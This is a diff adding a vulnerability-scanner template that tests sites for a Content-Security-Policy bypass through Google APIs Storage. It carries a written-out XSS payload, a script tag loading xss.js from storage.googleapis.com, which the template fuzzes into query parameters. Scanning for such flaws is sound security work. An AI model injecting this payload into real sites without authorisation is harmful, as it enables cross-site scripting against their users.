@@ -1,0 +1,55 @@
+id: googleapis-storage-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google APIs Storage
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,googleapis-storage
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "googleapis.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: googleapis_storage_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://storage.googleapis.com/bypass_csp/xss.js"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "googleapis_storage_csp_xss == true"
+# digest: 4b0a00483046022100c2840eddaba7462e536add355526fa955cd8903733f9d93c640ed0f4a8f8e8b30221008f9ba4cfb7acf304586755ca1d852c3a51b39f692eb8345f083ae083af5bdb41:922c64590222798bb761d5b6d8e72950
